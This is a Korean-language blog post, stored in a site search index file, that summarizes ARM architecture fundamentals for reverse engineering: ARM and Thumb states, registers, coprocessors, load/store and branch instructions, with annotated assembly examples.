<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ARM 리버스 엔지니어링 기초</title>
    <url>/2022/07/02/arm-reverse-engineering-basics/</url>
    <content><![CDATA[<blockquote class="callout-note">
    <p>
    <strong>유의사항</strong><br>
    이 글은 Practical Reverse Engineering 책의 내용을 학습 목적으로 정리하고 일부를 수정하거나 추가한 내용입니다.
    </p>
</blockquote>
<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<p>ARM 아키텍처의 특징과 인스트럭션을 이해하고, 기초적인 리버스 엔지니어링을 연습해 보겠습니다.</p>
<h2 id="arm-%EC%95%84%ED%82%A4%ED%85%8D%EC%B2%98-%EC%86%8C%EA%B0%9C" tabindex="-1">ARM 아키텍처 소개</h2>
<p>1980년대 후반 개발된 ARM 아키텍처는 휴대폰, 자동차, 텔레비전 등 다양한 임베디드 장치에서 사용되고 있습니다. ARM 아키텍처는 ARM 홀딩스가 디자인한 후 다른 회사들에 라이센스를 판매하며, 애플, 퀄컴과 같은 파트너사는 라이센스를 구매하여 자신들의 장치에 사용할 프로세서에 적용합니다. 이들 프로세서는 모두 ARM 레퍼런스 매뉴얼에 정의된 기본적인 인스트럭션 집합과 메모리 모델을 구현하고 있습니다.</p>
<p><img src="/images/arm-reverse-engineering-basics/1.png" alt="1.png"></p>
<h2 id="arm-%EC%95%84%ED%82%A4%ED%85%8D%EC%B2%98%EC%9D%98-%ED%8A%B9%EC%A7%95" tabindex="-1">ARM 아키텍처의 특징</h2>
<p>ARM은 RISC 아키텍처로, CISC 아키텍처인 x86/x64와는 몇 가지 다른 점이 있습니다.</p>
<ol>
<li>ARM 인스트럭션 집합은 x86/64에 비해 작지만, 범용 레지스터의 수는 더 많습니다.</li>
<li>인스트럭션의 길이가 고정되어 있습니다.</li>
<li>메모리 접근에 load-store 모델을 사용합니다.
<ul>
<li>데이터를 연산하기 전 반드시 메모리에서 레지스터로 옮겨야 하며, 오직 load와 store 인스트럭션만 메모리에 접근할 수 있습니다.</li>
</ul>
</li>
</ol>
<p>ARM은 여러 가지의 서로 다른 특권 수준(privileged modes)을 제공하는데, 일단은 편의를 위해 User를 x86/64에서의 Ring 3, Supervisor를 Ring 0로 생각해도 좋습니다.</p>
<p><img src="/images/arm-reverse-engineering-basics/2.jpg" alt="2.jpg"></p>
<p>ARM 프로세서는 두 가지 상태(state), ARM과 Thumb으로 동작할 수 있습니다. 이 때 상태는 사용할 인스트럭션 집합과 관련이 있으며, 특권 수준과는 무관합니다. ARM 상태에서 인스트럭션의 길이는 항상 32비트이며, Thumb 상태에서는 16비트 또는 32비트입니다.</p>
<p>프로세서의 상태는 다음과 같이 결정됩니다.</p>
<ol>
<li><code>BX</code> 또는 <code>BLX</code> 인스트럭션으로 분기할 때, 목적지 레지스터의 최하위 비트(LSB)가 1이면 Thumb 상태로 전환합니다.</li>
<li>현재 <code>CPSR</code> 레지스터의 <code>T</code> 비트가 1이면 Thumb 상태입니다.</li>
</ol>
<p>대부분의 ARM과 Thumb 인스트럭션은 동일한 니모닉(mnemonic)을 갖고 있지만, Thumb 인스트럭션 중 길이가 32비트인 것은 <code>.w</code> 접미사가 붙습니다.</p>
<p>ARM은 또한 조건부 실행(conditional execution)을 지원합니다. 이는 인스트럭션에 특정한 조건이 함께 인코딩되어 있고, 이 조건을 만족하는 경우에만 실행됨을 의미합니다. 조건부 실행을 사용하면 분기문에 필요한 인스트럭션의 개수를 줄일 수 있어 유용합니다. ARM 상태에서 모든 인스트럭션은 조건부 실행이 가능하지만, 조건의 기본값은 ‘항상 실행함(<code>AL</code>)’ 입니다. Thumb 상태에서는 특별한 인스트럭션 <code>IT</code> 를 사용해야만 조건부 실행이 가능합니다.</p>
<p>또 다른 ARM의 독특한 기능은 배럴 시프터(barrel shifter)로, 특정한 인스트럭션은 값을 시프트하거나 회전(rotate)시키는 다른 연산을 포함할 수 있습니다. (e.g. <code>MOV R1, R0, LSL #1</code> 은 <code>R0</code> 레지스터를 왼쪽으로 1비트 시프트한 후 <code>R1</code> 레지스터에 대입합니다) 배럴 시프터는 조건부 실행과 마찬가지로 인스트럭션의 개수를 줄이는 데 도움이 됩니다.</p>
<h2 id="%EB%B2%94%EC%9A%A9-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0" tabindex="-1">범용 레지스터</h2>
<p>ARM 아키텍처는 16개의 32비트 범용 레지스터 <code>R0</code> , <code>R1</code> , … , <code>R15</code> 를 제공합니다. 모든 범용 레지스터는 개발자가 자유롭게 사용할 수 있지만, 실제로는 앞의 12개 레지스터만 범용으로 쓰이고 나머지는 특수 레지스터처럼 사용됩니다.</p>
<ul>
<li><code>R13</code> 은 스택 포인터(<code>SP</code>)를 나타냅니다.</li>
<li><code>R14</code> 는 링크 레지스터(<code>LR</code>)를 나타냅니다.
<ul>
<li>링크 레지스터(link register)는 함수의 리턴 주소를 보관하는 레지스터로, 일부 인스트럭션에 의해 사용됩니다. (e.g. <code>BL</code> 인스트럭션은 함수를 호출하기 전 항상 <code>LR</code> 에 리턴 주소를 저장합니다)</li>
</ul>
</li>
<li><code>R15</code> 는 프로그램 카운터(<code>PC</code>)를 나타냅니다.
<ul>
<li>ARM 상태에서 <code>PC</code> 는 x86/64와는 다르게, 현재 인스트럭션 주소에 8을 더한 값입니다. (ARM 인스트럭션 2개 뒤의 주소)</li>
<li>Thumb 상태에서 <code>PC</code> 는 현재 인스트럭션 주소에 4를 더한 값입니다. (Thumb 인스트럭션 2개 뒤의 주소)</li>
<li><code>PC</code> 레지스터에 주소를 대입할 수 있으며, 대입 즉시 그 주소부터 다음 인스트럭션이 실행됩니다.</li>
<li><code>gdb</code> 디버거에서는 <code>PC</code> 레지스터의 값으로 현재 인스트럭션의 주소를 보여주는데, 이는 편의상 <code>PC</code> 가 alias되어있기 때문에 그런 것으로 실제와는 차이가 있음에 유의합니다.</li>
</ul>
</li>
</ul>
<p>ARM은 현재 프로세서와 실행 흐름의 상태를 <code>CPSR</code> 레지스터에 보관합니다. (<code>APSR</code> 레지스터라고도 합니다) <code>CPSR</code> 레지스터에는 다음을 포함한 다양한 플래그들이 있습니다.</p>
<ul>
<li><code>E</code> (엔디언 비트) - ARM은 빅 엔디언 모드와 리틀 엔디언 모드 모두에서 동작할 수 있습니다.
<ul>
<li>리틀 엔디언은 0, 빅 엔디언은 1이며 대부분의 경우 리틀 엔디언입니다.</li>
</ul>
</li>
<li><code>T</code> (Thumb 비트) - Thumb 상태인 경우 1입니다.</li>
<li><code>M</code> (Mode 필드) - 현재 특권 수준(e.g. User, Supervisor)을 의미합니다.</li>
</ul>
<p><img src="/images/arm-reverse-engineering-basics/3.png" alt="3.png"></p>
<h2 id="%EB%B3%B4%EC%A1%B0-%ED%94%84%EB%A1%9C%EC%84%B8%EC%84%9C%EC%99%80-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EC%84%A4%EC%A0%95" tabindex="-1">보조 프로세서와 시스템 설정</h2>
<p>ARM 아키텍처는 확장 인스트럭션과 시스템 설정을 위해 사용되는 보조 프로세서(coprocessors)를 제공합니다. (e.g. x86/64에서는 시스템 설정을 <code>CR0</code> , <code>CR4</code> 레지스터에, ARM에서는 <code>CP15</code> 레지스터에 보관합니다) 보조 프로세서는 <code>CP0</code> , <code>CP1</code> , … , <code>CP15</code> 의 16개가 존재합니다. (코드에서는 <code>P0</code> , … , <code>P15</code> 로 사용됩니다) <code>CP14</code> 와 <code>CP15</code> 는 디버깅과 시스템 설정을 위해 사용되고, 나머지는 제조사가 특정한 인스트럭션을(e.g. 부동소수점 연산) 구현하기 위해 선택적으로 사용할 수 있습니다.</p>
<p>각각의 보조 프로세서는 16개의 레지스터와 8개의 opcode를 가지고 있으며, opcode의 시맨틱(semantic)은 프로세서마다 다릅니다. 보조 프로세서에 대한 접근은 오직 <code>MRC</code> , <code>MCR</code> 인스트럭션을 사용한 읽기와 쓰기만 가능합니다. (e.g. <code>MRC P15, 0, R0, C2, C0, 0</code> 은 보조 프로세서 <code>CP15</code> 의 <code>C2</code> / <code>C0</code> 레지스터를 opcode <code>0</code> / <code>0</code> 으로 읽어 범용 레지스터 <code>R0</code> 에 대입합니다) <code>MRC</code> 와 <code>MCR</code> 인스트럭션 자체는 높은 특권 수준을 요구하지 않지만, 일부 보조 프로세서의 레지스터와 opcode들은 오로지 Supervisor 수준에서만 접근이 가능합니다. 이들 레지스터를 User 수준에서 읽으려 하면 익셉션이 발생할 것입니다.</p>
<h2 id="%EC%9D%B8%EC%8A%A4%ED%8A%B8%EB%9F%AD%EC%85%98-%EC%A7%91%ED%95%A9%EC%9D%98-%ED%8A%B9%EC%A7%95" tabindex="-1">인스트럭션 집합의 특징</h2>
<p>조건부 실행이나 배럴 시프터 외에도, ARM 인스트럭션에는 x86에 없는 특징들이 있습니다.</p>
<ol>
<li>일부 인스트럭션은 레지스터의 범위를 인자로 받을 수 있습니다.
<ul>
<li>e.g. <code>STM R1, &#123;R6-R10&#125;</code> 은 레지스터 <code>R1</code> 이 가리키는 주소에 <code>R6</code> , <code>R7</code> , … , <code>R10</code> 의 5개 값을 순서대로 씁니다.</li>
<li>연속하지 않는 레지스터들도 쉼표를 사용해서(e.g. <code>&#123;R1,R5,R8&#125;</code>) 인자로 전달할 수 있습니다.</li>
</ul>
</li>
<li>일부 인스트럭션은 읽기, 쓰기 이후 선택적으로 베이스 레지스터의 값을 갱신할 수 있습니다.
<ul>
<li>e.g. <code>STM SP!, &#123;R6-R10&#125;</code> 을 실행하면 <code>SP</code> 의 값은 <code>R10</code> 의 값이 쓰인 주소의 4바이트 뒤로 갱신됩니다.</li>
</ul>
</li>
</ol>
<h2 id="load%EC%99%80-store-%EC%9D%B8%EC%8A%A4%ED%8A%B8%EB%9F%AD%EC%85%98" tabindex="-1">Load와 Store 인스트럭션</h2>
<h3 id="ldr-%EA%B3%BC-str" tabindex="-1"><code>LDR</code> 과 <code>STR</code></h3>
<p><code>LDR</code> 과 <code>STR</code> 인스트럭션은 메모리에서 1바이트, 2바이트 또는 4바이트를 읽고 씁니다. 인스트럭션의 문법은 살짝 복잡한데, 오프셋을 지정하거나 베이스 레지스터를 갱신하는 여러 가지 방법이 존재하기 때문입니다. 가장 단순한 경우는 다음과 같습니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn]        <span class="comment">; Rt = *Rn</span></span><br><span class="line"><span class="keyword">STR</span> Rt, [Rn]        <span class="comment">; *Rn = Rt</span></span><br></pre></td></tr></table></figure>
<p><code>LDR</code> , <code>STR</code> 인스트럭션은 베이스 레지스터와 오프셋을 인자로 받는데, 오프셋의 형태가 3가지 있고 베이스 레지스터를 갱신하는 방법이 3가지 있습니다. 먼저 3가지의 오프셋 형태를 살펴보겠습니다.</p>
<ol>
<li>상수가 오프셋인 경우
<ul>
<li>상수 값(immediate)은 단순히 정수로, 특정 오프셋의 데이터에 접근하기 위해 베이스 레지스터에 더하거나 빼는 경우입니다. (e.g. 구조체, vtable의 특정 필드 접근)</li>
</ul>
</li>
</ol>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, imm]   <span class="comment">; Rt = *(Rn + imm)</span></span><br><span class="line"><span class="keyword">STR</span> Rt, [Rn, imm]   <span class="comment">; *(Rn + imm) = Rt</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>레지스터가 오프셋인 경우
<ul>
<li>보통 배열에 접근하는데, 인덱스가 런타임에 계산되는 경우입니다.</li>
</ul>
</li>
</ol>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, Rm]    <span class="comment">; Rt = *(Rn + Rm)</span></span><br><span class="line"><span class="keyword">STR</span> Rt, [Rn, Rm]    <span class="comment">; *(Rn + Rm) = Rt</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>레지스터의 정수배가 오프셋인 경우
<ul>
<li>보통 반복문 안에서 배열을 순회하면서, 원소의 크기 단위로 포인터를 증가시키는 경우입니다.</li>
</ul>
</li>
</ol>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, Rm, shift]     <span class="comment">; Rt = *(Rn + Rm * shift)</span></span><br><span class="line"><span class="keyword">STR</span> Rt, [Rn, Rm, shift]     <span class="comment">; *(Rn + Rm * shift) = Rt</span></span><br></pre></td></tr></table></figure>
<p>다음으로 베이스 레지스터를 갱신하는 3가지 방법입니다.</p>
<ol>
<li>오프셋 방식
<ul>
<li>가장 단순하고 흔한 방식으로, 베이스 레지스터는 절대 갱신되지 않습니다.</li>
<li>느낌표(<code>!</code>)가 없고 상수가 대괄호 안에 있으면 오프셋 방식입니다.</li>
</ul>
</li>
</ol>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, offset]        <span class="comment">; Rt = *(Rn + offset)</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>pre-indexed 방식
<ul>
<li>베이스 레지스터를 먼저 갱신한 후 참조합니다. (C언어의 전위 연산자와 유사)</li>
</ul>
</li>
</ol>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, offset]!       <span class="comment">; Rt = *(Rn + offset)</span></span><br><span class="line">                            <span class="comment">; Rn = Rn + offset</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>post-indexed 방식
<ul>
<li>베이스 레지스터를 먼저 참조한 후 갱신합니다. (C언어의 후위 연산자와 유사)</li>
</ul>
</li>
</ol>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn], offset]       <span class="comment">; Rt = *Rn</span></span><br><span class="line">                            <span class="comment">; Rn = Rn + offset</span></span><br></pre></td></tr></table></figure>
<h3 id="ldr-%EA%B3%BC-pseudo-%EC%9D%B8%EC%8A%A4%ED%8A%B8%EB%9F%AD%EC%85%98" tabindex="-1"><code>LDR</code> 과 pseudo 인스트럭션</h3>
<p>일부 디스어셈블 결과에서 다음과 같이 <code>LDR</code> 을 사용하는 방식을 볼 수도 있습니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">LDR.W</span> <span class="built_in">R8</span>, <span class="number">=0x2932E00</span>        <span class="comment">; LDR R8, [PC, x]</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R2</span>, <span class="symbol">=a04d</span> <span class="comment">; &quot;%04d&quot;      ; LDR R2, [PC, y]</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R3</span>, <span class="symbol">=__imp_realloc</span>      <span class="comment">; LDR R3, [PC, z]</span></span><br></pre></td></tr></table></figure>
<p>이 방식은 사실 pseudo 인스트럭션으로, 디스어셈블러들이 편의상 위와 같이 나타내는 것입니다. 실제로는 <code>PC</code> 를 베이스 레지스터로, 상수를 오프셋으로 하는 PC-relative 방식의 <code>LDR</code> 인스트럭션입니다.</p>
<p>다른 pseudo 인스트럭션으로 레이블이나 함수의 주소를 레지스터에 대입하는 <code>ADR</code> 인스트럭션이 있습니다. 보통 점프 테이블이나 콜백 구현에 사용되는데, 마찬가지로 내부적으로는 PC-relative 방식의 <code>LDR</code> 인스트럭션입니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ADR</span> <span class="built_in">R5</span>, dword_9528</span><br><span class="line"><span class="symbol">LDRD.W</span> <span class="built_in">R4</span>, <span class="built_in">R5</span>, [<span class="built_in">R5</span>]</span><br></pre></td></tr></table></figure>
<h3 id="ldm-%EA%B3%BC-stm" tabindex="-1"><code>LDM</code> 과 <code>STM</code></h3>
<p><code>LDM</code> 과 <code>STM</code> 은 베이스 레지스터가 가리키는 주소에서 여러 개의 값을 한번에 읽고 씁니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">LDM</span>&lt;mode&gt; Rn[!], &#123;Rm&#125;</span><br><span class="line"><span class="symbol">STM</span>&lt;mode&gt; Rn[!], &#123;Rm&#125;</span><br></pre></td></tr></table></figure>
<p><code>Rn</code> 은 베이스 레지스터로, 값을 읽고 쓸 메모리 주소를 가리킵니다. 느낌표(<code>!</code>)는 선택인데, 느낌표가 있으면 베이스 레지스터를 실행 후 갱신함을(writeback) 의미합니다. <code>Rm</code> 은 레지스터들의 범위이며, <code>mode</code> 는 다음과 같이 4가지가 존재합니다.</p>
<ol>
<li><code>IA</code> (increment after) - <code>베이스 주소</code> 부터 값을 읽고 쓰며, writeback은 <code>마지막으로 읽고 쓴 주소 + 4</code> 입니다.
<ul>
<li>명시된 <code>mode</code> 가 없는 경우 기본값입니다.</li>
</ul>
</li>
<li><code>IB</code> (increment before) - <code>베이스 주소 + 4</code> 부터 값을 읽고 쓰며, writeback은 <code>마지막으로 읽고 쓴 주소</code> 입니다.</li>
<li><code>DA</code> (decrement after) - <code>베이스 주소</code> 부터 낮은 방향으로(거꾸로) 값을 읽고 쓰며, writeback은 <code>마지막으로 읽고 쓴 주소 - 4</code> 입니다.</li>
<li><code>DB</code> (decrement before) - <code>베이스 주소 - 4</code> 부터 낮은 방향으로(거꾸로) 값을 읽고 쓰며, writeback은 <code>마지막으로 읽고 쓴 주소</code> 입니다.</li>
</ol>
<p>예를 들어, 다음은 <code>IA</code> 모드와 writeback을 사용하여 여러 값을 읽고 쓰는 예제입니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> <span class="built_in">R6</span>, <span class="symbol">=mem</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="number">#10</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R1</span>, <span class="number">#11</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R2</span>, <span class="number">#12</span></span><br><span class="line"><span class="keyword">LDM</span> <span class="built_in">R6</span>!, &#123;<span class="built_in">R3</span>,<span class="built_in">R4</span>,<span class="built_in">R5</span>&#125;</span><br><span class="line"><span class="keyword">STMIA</span> <span class="built_in">R6</span>!, &#123;<span class="built_in">R0</span>,<span class="built_in">R1</span>,<span class="built_in">R2</span>&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/arm-reverse-engineering-basics/4.png" alt="4.png"></p>
<p><code>LDM</code> 과 <code>STM</code> 은 한번에 여러 값을 옮길 수 있어, 보통 블록 단위의 복사 등에 사용됩니다. (e.g. 복사할 길이를 컴파일 시점에 알고 있을 경우, <code>memcpy</code> 대신 사용할 수 있습니다) 또한 ARM 상태에서 함수의 시작과 끝에서도 사용되는데, 함수 프롤로그와 에필로그의 역할을 합니다.</p>
<ul>
<li><code>STMFD</code> 와 <code>LDMFD</code> 는 각각 <code>STMDB</code> , <code>LDMIA</code> 의 pseudo 인스트럭션입니다.</li>
</ul>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">STMFD</span> <span class="built_in">SP</span>!, &#123;<span class="built_in">R4</span>-<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;      <span class="comment">; 레지스터와 리턴 주소를 스택에 보관합니다.</span></span><br><span class="line"><span class="keyword">LDMFD</span> <span class="built_in">SP</span>!, &#123;<span class="built_in">R4</span>-<span class="built_in">R11</span>,<span class="built_in">PC</span>&#125;      <span class="comment">; 레지스터와 리턴 주소를 꺼내고 반환합니다.</span></span><br></pre></td></tr></table></figure>
<h2 id="push-%EC%99%80-pop" tabindex="-1"><code>PUSH</code> 와 <code>POP</code></h2>
<p><code>PUSH</code> 와 <code>POP</code> 은 <code>LDM</code> , <code>STM</code> 과 비슷하지만, 두 가지 다른 특징이 있습니다.</p>
<ul>
<li><code>PUSH</code> 와 <code>POP</code> 은 <code>SP</code> 를 베이스 주소로 사용합니다.</li>
<li>실행 후 <code>SP</code> 가 자동으로 갱신됩니다.</li>
</ul>
<p>ARM 아키텍처에서도 스택은 x86/64와 마찬가지로 낮은 방향으로 자랍니다. 문법은 다음과 같으며, <code>&#123;Rn&#125;</code> 에는 레지스터들의 범위를 전달해야 합니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> &#123;Rn&#125;</span><br><span class="line"><span class="keyword">POP</span> &#123;Rn&#125;</span><br></pre></td></tr></table></figure>
<p>예를 들어, 다음은 <code>PUSH</code> 와 <code>POP</code> 을 이용해 스택에서 값을 읽고 쓰는 예제입니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">MOV.W</span> <span class="built_in">R0</span>, <span class="number">#10</span></span><br><span class="line"><span class="symbol">MOV.W</span> <span class="built_in">R1</span>, <span class="number">#11</span></span><br><span class="line"><span class="symbol">MOV.W</span> <span class="built_in">R2</span>, <span class="number">#12</span></span><br><span class="line"><span class="keyword">PUSH</span> &#123;<span class="built_in">R0</span>,<span class="built_in">R1</span>,<span class="built_in">R2</span>&#125;</span><br><span class="line"><span class="keyword">POP</span> &#123;<span class="built_in">R3</span>,<span class="built_in">R4</span>,<span class="built_in">R5</span>&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/arm-reverse-engineering-basics/5.png" alt="5.png"></p>
<p><code>PUSH</code> 와 <code>POP</code> 은 흔히 Thumb 상태에서 함수의 프롤로그와 에필로그로 사용됩니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">PUSH.W</span> &#123;<span class="built_in">R4</span>-<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;          <span class="comment">; 레지스터와 리턴 주소를 스택에 보관합니다.</span></span><br><span class="line"><span class="symbol">POP.W</span> &#123;<span class="built_in">R4</span>-<span class="built_in">R11</span>,<span class="built_in">PC</span>&#125;           <span class="comment">; 레지스터와 리턴 주소를 꺼내고 반환합니다.</span></span><br></pre></td></tr></table></figure>
<h2 id="%ED%95%A8%EC%88%98-%ED%98%B8%EC%B6%9C%EA%B3%BC-%EB%B6%84%EA%B8%B0" tabindex="-1">함수 호출과 분기</h2>
<p>ARM 아키텍처는 목적지 주소를 인코딩한 방식에 따라 함수 호출과 분기를 위한 다양한 인스트럭션을 제공하고 있습니다. 함수 호출의 리턴의 원리는 x86/64와 기본적으로 같지만, 몇 가지 사소한 차이점들이 있습니다.</p>
<ol>
<li>리턴 주소를 스택이나 링크 레지스터(<code>LR</code>)에 저장할 수 있습니다.
<ul>
<li>함수 에필로그에서 리턴 시 <code>POP &#123;PC&#125;</code> 와 같이 스랙에서 리턴 주소를 직접 꺼내 <code>PC</code> 에 대입하거나, <code>BX LR</code> 과 같이 링크 레지스터로 분기할 수 있습니다.</li>
</ul>
</li>
<li>분기할 때 목적지 주소의 최하위 비트(LSB)에 따라 ARM 상태와 Thumb 상태를 오갈 수 있습니다.</li>
<li>함수 호출 규약의 차이가 있습니다.
<ul>
<li>4개 매개변수까지 레지스터 <code>R0</code> , <code>R1</code> , <code>R2</code> , <code>R3</code> 을 통해 전달하며, 나머지는 스택을 통해 전달합니다.</li>
<li>리턴 값은 <code>R0</code> 에 보관합니다.</li>
</ul>
</li>
</ol>
<p>함수 호출과 분기에 사용되는 인스트럭션은 <code>B</code> , <code>BX</code> , <code>BL</code> 과 <code>BLX</code> 가 있습니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">B</span> label</span><br><span class="line"><span class="keyword">BL</span> label</span><br></pre></td></tr></table></figure>
<p><code>B</code> 는 단순한 분기로, x86/64에서의 <code>JMP</code> 와 동일합니다. 함수 호출에는 거의 사용되지 않지만, 리턴하지 않는 함수를 호출하기 위해 사용될 수 있습니다. 주로 반복문이나 조건문에서 코드 블록의 시작으로 돌아가거나 탈출하기 위해 사용됩니다. <code>BL</code> 은 branch with link로, 분기 전 <code>LR</code> 에 다음 인스트럭션의 주소를 저장합니다. x86/64에서의 <code>CALL</code> 과 비슷한 인스트럭션입니다. <code>B</code> 와 <code>BL</code> 은 모두 레이블의 오프셋만 인자로 받을 수 있습니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BX</span> Rm</span><br></pre></td></tr></table></figure>
<p><code>BX</code> 는 branch and exchange로, <code>B</code> 와 비슷하지만 목적지 주소가 레지스터로 전달되고 ARM과 Thumb 상태를 오갈 수 있습니다. (목적지 주소의 최하위 비트가 1이면 Thumb 상태가 됩니다) 흔히 함수 에필로그에서 리턴을 위해 사용되거나, (i.e. <code>BX LR</code>) 다른 상태의 코드로 분기할 때 사용됩니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BLX</span> label</span><br><span class="line"><span class="keyword">BLX</span> Rm</span><br></pre></td></tr></table></figure>
<p><code>BLX</code> 는 branch with link and exchange로, <code>BL</code> 과 비슷하지만 ARM과 Thumb 상태를 전환할 수 있으며 인자로 레지스터에 보관된 목적지 주소나 레이블의 오프셋 모두를 전달할 수 있습니다. (<code>BLX</code> 가 레이블의 오프셋을 인자로 받는 경우는 반드시 상태를 전환하기 위함입니다) <code>BL</code>과 <code>BLX</code> 는 모두 함수 호출에 사용되는데, <code>BL</code> 는 현재 인스트럭션으로부터 32MB 범위 안에 있는 함수 호출에 사용하며 <code>BLX</code> 는 함수의 주소가 정해지지 않은 (e.g. 함수 포인터) 경우 사용합니다. Thumb 상태에서 <code>BLX</code> 는 주로 라이브러리 함수 호출에 사용되며, ARM 상태에서는 <code>BL</code> 을 대신 사용합니다.</p>
<p>다음 예제는 어떤 함수를 디스어셈블한 결과인데, 함수 호출과 분기를 위한 인스트럭션이 어떻게 사용되고 있는지 살펴보겠습니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">PUSH.W</span> &#123;<span class="built_in">R4</span>,<span class="built_in">R5</span>,<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">ADDW</span> <span class="built_in">R11</span>, <span class="built_in">SP</span>, <span class="number">#8</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R3</span>, <span class="symbol">=__imp_malloc</span></span><br><span class="line"><span class="keyword">ADDS</span> <span class="built_in">R5</span>, <span class="built_in">R0</span>, <span class="number">#7</span></span><br><span class="line"><span class="symbol">BFC.W</span> <span class="built_in">R5</span>, <span class="number">#0</span>, <span class="number">#3</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R3</span>, [<span class="built_in">R3</span>]</span><br><span class="line"><span class="symbol">ADDS.W</span> <span class="built_in">R0</span>, <span class="built_in">R5</span>, <span class="number">#8</span></span><br><span class="line"><span class="keyword">BLX</span> <span class="built_in">R3</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R4</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="keyword">CBZ</span> <span class="built_in">R4</span>, loc_100C3AE</span><br><span class="line"><span class="keyword">ASRS</span> <span class="built_in">R3</span>, <span class="built_in">R5</span>, <span class="number">#0x1F</span></span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R3</span>, [<span class="built_in">R4</span>,<span class="number">#4</span>]</span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R5</span>, [<span class="built_in">R4</span>]</span><br><span class="line"><span class="keyword">B</span> loc_100C3B8</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_100C3AE:</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R1</span>, <span class="symbol">=aFailed</span> <span class="comment">; &quot;failed...&quot;</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R2</span>, <span class="built_in">R5</span></span><br><span class="line"><span class="keyword">MOVS</span> <span class="built_in">R0</span>, <span class="number">#7</span></span><br><span class="line"><span class="keyword">BL</span> foo</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_100C3B8:</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="built_in">R4</span></span><br><span class="line"><span class="symbol">POP.W</span> &#123;<span class="built_in">R4</span>,<span class="built_in">R5</span>,<span class="built_in">R11</span>,<span class="built_in">PC</span>&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>1행의 <code>PUSH.W &#123;R4,R5,R11,LR&#125;</code> 은 함수 프롤로그, 24행의 <code>POP.W &#123;R4,R5,R11,PC&#125;</code> 는 함수 에필로그에 해당합니다.</li>
<li>8행에서 <code>BLX</code> 를 이용해 <code>malloc</code> 라이브러리 함수를 호출하고 있습니다.</li>
<li>20행에서 <code>BL</code> 을 이용해 <code>foo</code> 함수를 호출하고 있습니다.</li>
</ul>
<h2 id="%EC%82%B0%EC%88%A0-%EC%97%B0%EC%82%B0" tabindex="-1">산술 연산</h2>
<p><code>MOV</code> 인스트럭션은 값을 대입하는 가장 단순한 인스트럭션입니다. 대입하는 값은 상수거나 레지스터의 값, 또는 레지스터의 값에 배럴 시프터를 사용한 값입니다. 배럴 시프터로는 값에 대한 왼쪽 시프트(<code>LSL</code>), 오른쪽 시프트(<code>LSR</code>, <code>ASR</code>), 회전(<code>ROR</code>, <code>RRX</code>)이 가능합니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="number">#0xa</span>            <span class="comment">; R0 = 0xa</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="built_in">R7</span>              <span class="comment">; R0 = R7</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R4</span>, <span class="built_in">R4</span>, <span class="keyword">LSR</span> <span class="number">#21</span>     <span class="comment">; R4 = (R4 &gt;&gt; 21)</span></span><br></pre></td></tr></table></figure>
